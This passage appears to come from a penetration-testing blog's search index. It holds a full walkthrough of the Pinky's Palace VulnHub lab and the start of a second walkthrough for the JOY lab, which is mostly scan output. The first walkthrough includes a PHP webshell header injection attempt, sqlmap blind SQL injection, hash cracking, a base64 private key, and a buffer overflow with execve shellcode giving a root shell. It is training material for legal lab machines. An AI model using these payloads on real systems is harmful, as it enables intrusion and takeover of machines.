AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZDIHslZJXVJH6dCHGaJRVy8WULZGgoqkKe8gfp/jibTQiMe8lIE8zFX2S8aXxWo4kSBd6i94zKj4YR2TcFj2o=| 256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEKiR+Y3n+2PC1Zjqgt/sE9mBtaxGwqMxPj19s2cpoYUMAC Address: 08:00:27:3C:08:49 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/12%OT=8080%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6OS:206A140%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=4%ISR=107%TI=Z%CI=I%II=I%TSOS:=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=MOS:5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=71OS:20)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=OS:0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)OS:U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.003 days (since Sat Feb 12 01:43:41 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.36 ms 192.168.110.27Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Feb 12 01:47:44 2022 -- 1 IP address (1 host up) scanned in 34.67 secondsTCP/8080 (HTTP)FFUF No directories enumeratedTCP/31337 (HTTP Proxy)FFUF No directories enumeratedInitial FootholdTCP/31337 (HTTP Proxy) - Adding entry to hosts file Proceed to http://$ip:31337 pinkys-palace Add pinkys-palace to /etc/hosts ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1] └─# echo &quot;192.168.110.27 pinkys-palace&quot; &amp;gt;&amp;gt; /etc/hosts TCP/8080 (HTTP) - Setting up the Proxy + Directory Enumeration Proceed to http://pinkys-palace:8080/ ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1] └─# curl http://pinkys-palace:8080/ &amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;403 Forbidden&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body bgcolor=&quot;white&quot;&amp;gt; &amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;403 Forbidden&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt; &amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.10.3&amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Still 403 Forbidden We should be able to bypass 403 Forbidden by using the proxy at TCP/31337 (Squid Proxy) Add TCP/31337 - Squid Proxy to your web browser Directory enumerate TCP/8080 - directory-list-2.3-medium.txt ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1] └─# ffuf -u http://pinkys-palace:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.html,.txt,.php&#39; -x http://$ip:31337/ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://pinkys-palace:8080/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Proxy : http://192.168.110.27:31337/ :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ littlesecrets-main [Status: 301, Size: 185, Words: 6, Lines: 8] :: Progress: [882240/882240] :: Job [1/1] :: 2392 req/sec :: Duration: [0:05:10] :: Errors: 0 :: littlesecrets-main Directory enumerate littlesecrets-main - common.txt ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1] └─# ffuf -u http://pinkys-palace:8080/littlesecrets-main/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -x http://$ip:31337/ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://pinkys-palace:8080/littlesecrets-main/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Proxy : http://192.168.110.27:31337/ :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ index.html [Status: 200, Size: 583, Words: 30, Lines: 31] login.php [Status: 200, Size: 68, Words: 8, Lines: 1] logs.php [Status: 200, Size: 6948147, Words: 715900, Lines: 1] :: Progress: [18460/18460] :: Job [1/1] :: 3484 req/sec :: Duration: [0:00:06] :: Errors: 0 :: littlesecrets-main/index.html littlesecrets-main/login.php littlesecrets-main/logs.php TCP/8080 (HTTP) - SQLi Database Enum w/ SQLMap Proceed to enumerated directories littlesecrets-main/index.html littlesecrets-main/logs.php Check if we could inject a webshell in the User-Agent field ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit] └─# curl -H &quot;User-Agent: &amp;lt;?php system(\\$_GET[&#39;c&#39;]); ?&amp;gt;&quot; -X &quot;http://192.168.110.27:31337/&quot; http://pinkys-palace:8080/littlesecrets-main/login.php Failed, it is not logged, this means that there is some sort of input sanitization Check if page is susceptible to SQLi Auth Bypass user=&#39;OR 1=1#&amp;amp;pass=&#39;OR 1=1# Could not bypass login page Determine if page is susceptible to SQLi w/ SQLMap ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit] └─# sqlmap -r sqli.txt --dbs --output-dir=$(pwd)/sqlmap --proxy=http://192.168.110.27:31337/ --level=5 --risk=3 Parameter: User-Agent (User-Agent) Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27&#39; AND (SELECT 6783 FROM (SELECT(SLEEP(5)))aLXs) AND &#39;xFNY&#39;=&#39;xFNY available databases [2]: [*] information_schema [*] pinky_sec_db Enumerate tables in pinky_sec_db database ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit] └─# sqlmap -r sqli.txt -D pinky_sec_db --tables --output-dir=$(pwd)/sqlmap --proxy=http://192.168.110.27:31337/ --level=5 --risk=3 Database: pinky_sec_db [2 tables] +-------+ | logs | | users | +-------+ Dump users table from pinky_sec_db database Database: pinky_sec_db Table: users [2 entries] +-----+----------------------------------+-------------+ | uid | pass | user | +-----+----------------------------------+-------------+ | 1 | f543dbfeaf238729831a321c7a68bee4 | pinky | | 2 | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage | +-----+----------------------------------+-------------+ Crack md5 hash ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit]└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --showd60dffed7cc0d87e1f4a11aa06ca73af:3pinkysaf33pinkysaf3 pinkymanage:3pinkysaf33pinkysaf3 Login w/ pinkymanage:3pinkysaf33pinkysaf3, failedTCP/64666 (SSH) SSH w/ pinkymanage:3pinkysaf33pinkysaf3 Privilege EscalationPinky - Via Creds Found Proceed to the web directory /var/www/html/littlesecrets-main/ pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ ls -la total 24 drwxr-xr-x 3 root root 4096 Feb 2 2018 . drwxr-xr-x 3 root root 4096 Feb 2 2018 .. -rw-r--r-- 1 root root 583 Feb 2 2018 index.html -rw-r--r-- 1 root root 934 Feb 2 2018 login.php -rw-r--r-- 1 root root 464 Feb 2 2018 logs.php drwxr-xr-x 2 root root 4096 Feb 2 2018 ultrasecretadminf1l35 pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ ultrasecretadminf1l35 View files in ultrasecretadminf1l35 pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ls -la total 16 drwxr-xr-x 2 root root 4096 Feb 2 2018 . drwxr-xr-x 3 root root 4096 Feb 2 2018 .. -rw-r--r-- 1 root root 99 Feb 2 2018 note.txt -rw-r--r-- 1 root root 2270 Feb 2 2018 .ultrasecret pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ note.txt .ultrasecret View content in the files pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat note.txt .ultrasecret Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh.. LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2 K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1 NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3 M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5 QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3 bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1 ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo= The key is base64 encoded, = is used as padding for base64 Decode ┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit] └─# base64 -d encoded.txt &amp;gt; id_rsa; chmod 600 id_rsa SSH into pinky w/ id_rsa Root - Via Buffer Overflow (64 Bit) View files in pinky’s home directory pinky@pinkys-palace:~$ ls -la total 44 drwx------ 3 pinky pinky 4096 Feb 2 2018 . drwxr-xr-x 4 root root 4096 Feb 2 2018 .. -rwsr-xr-x 1 root root 8880 Feb 2 2018 adminhelper lrwxrwxrwx 1 root root 9 Feb 1 2018 .bash_history -&amp;gt; /dev/null -rw-r--r-- 1 pinky pinky 220 Jan 28 2018 .bash_logout -rw-r--r-- 1 pinky pinky 3526 Jan 28 2018 .bashrc lrwxrwxrwx 1 pinky pinky 9 Feb 1 2018 .mysql_history -&amp;gt; /dev/null -rw-r--r-- 1 root root 280 Feb 2 2018 note.txt -rw-r--r-- 1 pinky pinky 675 Jan 28 2018 .profile drwx------ 2 pinky pinky 4096 Feb 2 2018 .ssh -rw------- 1 pinky pinky 1815 Feb 2 2018 .viminfo adminhelper note.txt View content of the files pinky@pinkys-palace:~$ cat note.txt Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I&#39;m fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :( pinky@pinkys-palace:~$ Execute adminhelper to see what it does pinky@pinkys-palace:~$ ./adminhelper $(python -c &#39;print &quot;A&quot; * 500&#39;) Segmentation fault Buffer Overfow Binary Determine if ASLR is disabled pinky@pinkys-palace:~$ cat /proc/sys/kernel/randomize_va_space 0 Transfer adminhelper to kali Determine buffer size to crash adminhelper Buffer Size: 100 Create pattern pattern_create 100AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL run $(python -c &#39;print &quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;&#39;) Determine EIP offset pattern_offset IAAeAA4AAJAAfAA5AAKAAgAA6AAL RIP offset: 72 Test RIP offset w/ Bs run $(python -c &#39;print &quot;A&quot; * 72 + &quot;B&quot; * 6&#39;) Since ASLR is disabled, we can store our shellcode into an environment variable. After storing shellcode into an environment variable, we can use getenvaddr.c to determine the environment variable address Continue exploit on target Store our shellcode into an environment variable export shellcode=$(python -c &#39;print &quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;&#39;) Determine the environment variable address w/ getenv.c pinky@pinkys-palace:~$ nc 192.168.110.4 4444 &amp;gt; getenvaddr.cpinky@pinkys-palace:~$ gcc getenvaddr.c -o getenvaddrpinky@pinkys-palace:~$ ./getenvaddr shellcode ./adminhelper shellcode will be at 0x7fffffffeeb9pinky@pinkys-palace:~$ Return Address: 0x7fffffffeeb9 Little Endian: \\xb9\\xee\\xff\\xff\\xff\\x7f Obtain root shell pinky@pinkys-palace:~$ ./adminhelper $(python -c &#39;print &quot;A&quot; * 72 + &quot;\\xb9\\xee\\xff\\xff\\xff\\x7f&quot;&#39;)AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����# iduid=1000(pinky) gid=1000(pinky) euid=0(root) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)# whoamiroot# Root Flag root# cd /root# lsroot.txt# cat root.txt ===========[!!!CONGRATS!!!]===========[+] You r00ted Pinky&#39;s Palace Intermediate![+] I hope you enjoyed this box![+] Cheers to VulnHub![+] Twitter: @Pink_P4ntherFlag: 99975cfc5e2eb4c199d38d4a2b2c03ce# " }, { "title": "Vulnhub - Digitalworld.local (JOY)", "url": "/posts/Digitalworld.local-(JOY)/", "categories": "Vulnhub, Linux", "tags": "tcp/22-ftp/exploit, linux-priv-esc/linux-creds-found, linux-priv-esc/sudo/unknown-exec", "date": "2022-02-11 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Fri Feb 11 18:02:47 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-JOY/192.168.110.26/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-JOY/192.168.110.26/scans/xml/_full_tcp_nmap.xml 192.168.110.26Nmap scan report for 192.168.110.26Host is up, received arp-response (0.00040s latency).Scanned at 2022-02-11 18:02:48 +08 for 63sNot shown: 65523 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 64 ProFTPD 1.2.10| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drwxrwxr-x 2 ftp ftp 4096 Jan 6 2019 download| -rw-r--r-- 1 ftp ftp 563 Feb 11 17:41 id_rsa.pub|_drwxrwxr-x 2 ftp ftp 4096 Jan 10 2019 upload22/tcp open ssh syn-ack ttl 64 Dropbear sshd 0.34 (protocol 2.0)25/tcp open smtp syn-ack ttl 64 Postfix smtpd|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=JOY| Subject Alternative Name: DNS:JOY| Issuer: commonName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-12-23T14:29:24| Not valid after: 2028-12-20T14:29:24| MD5: 9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b| SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165| -----BEGIN CERTIFICATE-----| MIICvDCCAaSgAwIBAgIJAOB9FmtuDenTMA0GCSqGSIb3DQEBCwUAMA4xDDAKBgNV| BAMMA0pPWTAeFw0xODEyMjMxNDI5MjRaFw0yODEyMjAxNDI5MjRaMA4xDDAKBgNV| BAMMA0pPWTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKCCTsg68Xt| Voexi0RYRs0lVeJTsKFffjgkLN5obSRTZOxM1M37pvs5+mBgNlgFy6loMbjUbgn8| zlri4m/X6kTWGWrUDUr6QmqtndBRzZZAF+74LAmVIOekuFWWjgH1bhHAVq7rQhJ+| IhRnEE6N5IdVzSjbrVpLNacYMHMSXOlJ0DeRThF4YgpNQBD8GfDUqKDLxX7wg9M+| vAk4UwJ9l16zb5+mhyuOEAesCcdEXCBmxsMN1B8wGR2BlzLFXsTYHcEqcnNBN2aU| Jw0YTqi/2a7GOBIVY5v2LmnO4TTQuEZ6j/a2zAt58dvIaRdCcwlmzVaQ/QdhSLpl| v9Yvg8Fo/YsCAwEAAaMdMBswCQYDVR0TBAIwADAOBgNVHREEBzAFggNKT1kwDQYJ| KoZIhvcNAQELBQADggEBAA4HnoLSM97sTHyvzxGXfjrWhfrPM18Qzh+iVL46XMjc| YkZnAiyeU2FlY4xxlVjah+eb1pdNLYymbDdisv6HIkA7dfnf6jWBD2YxYSHhLfS7| dwLklgMLeoVNI3EjjkWGiIlfDRXwkwD8GglotAlAgFsBr4SKtnI3vEp6nrlfjj6y| VAxSZm3Q9z3Pm9WUZ8S6wV3MnoT5HTnRivt38Kbd1x24Bn1RsyrPIjHVteWZ+9vw| wX+4SmJ9suq568berTNJ3kv3kO0NSJO4O4z6QelwQB14lflbBMJATxCBDyIUtyow| x9Vlo8bbytCdNblSAjyxriZp1lZPmLOSe0D1YgpZWDQ=|_-----END CERTIFICATE-----|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF880/tcp open http syn-ack ttl 64 Apache httpd 2.4.25| http-ls: Volume /| SIZE TIME FILENAME| - 2016-07-19 20:03 ossec/|_|_http-title: Index of /|_http-server-header: Apache/2.4.25 (Debian)| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET110/tcp open pop3 syn-ack ttl 64 Dovecot pop3d| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-01-27T17:23:23| Not valid after: 2032-10-05T17:23:23| MD5: c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6| -----BEGIN CERTIFICATE-----| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time|_pop3-capabilities: AUTH-RESP-CODE SASL STLS PIPELINING RESP-CODES TOP UIDL CAPA139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap syn-ack ttl 64 Dovecot imapd|_ssl-date: TLS randomness does not represent time|_imap-capabilities: ID OK post-login LOGINDISABLEDA0001 STARTTLS more Pre-login ENABLE capabilities listed have LOGIN-REFERRALS SASL-IR IMAP4rev1 LITERAL+ IDLE| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-01-27T17:23:23| Not valid after: 2032-10-05T17:23:23| MD5: c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6| -----BEGIN CERTIFICATE-----| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH| 